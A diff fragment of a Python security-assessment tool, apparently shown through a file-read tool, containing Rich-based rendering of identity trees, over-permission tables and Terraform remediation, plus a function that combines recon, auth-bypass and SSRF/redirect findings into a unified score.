+  1932→                            cc = type_colors.get(child_node["type"], "white")
+  1933→                            cl = child_node["label"]
+  1934→                            if len(cl) > 45:
+  1935→                                cl = cl[:42] + "..."
+  1936→                            branch.add(
+  1937→                                f"[{cc}]{cl}[/{cc}] [dim]({child_edge['relation']})[/]"
+  1938→                            )
+  1939→
+  1940→        console.print(tree)
+  1941→
+  1942→    # Over-permissions table
+  1943→    overpermissions = nhi.get("overpermissions", [])
+  1944→    if overpermissions:
+  1945→        table = Table(title=f"Over-Permissions — {len(overpermissions)} detected",
+  1946→                      border_style="red", header_style="bold red", show_lines=False)
+  1947→        table.add_column("Severity", style="bold", width=10)
+  1948→        table.add_column("Pattern", style="yellow", width=20)
+  1949→        table.add_column("Identity", style="cyan")
+  1950→        table.add_column("Description", style="white")
+  1951→        sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green"}
+  1952→        for op in overpermissions[:15]:
+  1953→            sev = op.get("severity", "medium")
+  1954→            table.add_row(
+  1955→                f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
+  1956→                op.get("pattern", ""),
+  1957→                op.get("identity", "")[:40],
+  1958→                op.get("description", "")[:60]
+  1959→            )
+  1960→        console.print(table)
+  1961→
+  1962→    # Terraform remediation
+  1963→    remediation = nhi.get("remediation_tf", "")
+  1964→    if remediation:
+  1965→        tf_lines = remediation.split("\n")[:20]
+  1966→        tf_display = "\n".join(tf_lines)
+  1967→        if len(remediation.split("\n")) > 20:
+  1968→            tf_display += "\n  ... (truncated)"
+  1969→        console.print()
+  1970→        console.print(Panel(
+  1971→            Group(
+  1972→                Text("  Terraform Remediation Patch:", style="bold dim"),
+  1973→                Text(""),
+  1974→                Text(f"  {tf_display}", style="green"),
+  1975→            ),
+  1976→            border_style="dim",
+  1977→            title="[dim]Remediation[/dim]",
+  1978→            title_align="left",
+  1979→            padding=(0, 2),
+  1980→        ))
+  1981→
+  1982→
+  1983→# ══════════════════════════════════════════════════════════════════════════════
+  1984→# UNIFIED VERDICT — combines scores from all 8 modules
+  1985→# ══════════════════════════════════════════════════════════════════════════════
+  1986→
+  1987→def compute_unified_verdict(report: Dict[str, Any]) -> Dict[str, Any]:
+  1988→    """Combine all module scores into a unified verdict."""
+  1989→    scores = {}
+  1990→    # RECON: weighted by severity counts
+  1991→    recon = report.get("recon", {})
+  1992→    sc = recon.get("severity_counts", {})
+  1993→    scores["recon"] = min(100, sc.get("critical", 0) * 25 + sc.get("high", 0) * 15 +
+  1994→                          sc.get("medium", 0) * 8 + sc.get("low", 0) * 3 + sc.get("info", 0))
+  1995→    # AUTH: bypasses / 75 * 100
+  1996→    auth = report.get("auth_bypass", {})
+  1997→    scores["auth"] = min(100, int((auth.get("bypasses_successful", 0) / max(1, auth.get("total_attempts", 1))) * 400))
+  1998→    # CHAIN: SSRF + open redirects
+  1999→    chain = report.get("chain_hunter", {})
+  2000→    scores["chain"] = min(100, chain.get("ssrf_detected", 0) * 25 + chain.get("open_redirects", 0) * 15)
+
+[showing lines 1-2000 of 3061; use offset=2001 with limit to continue reading]
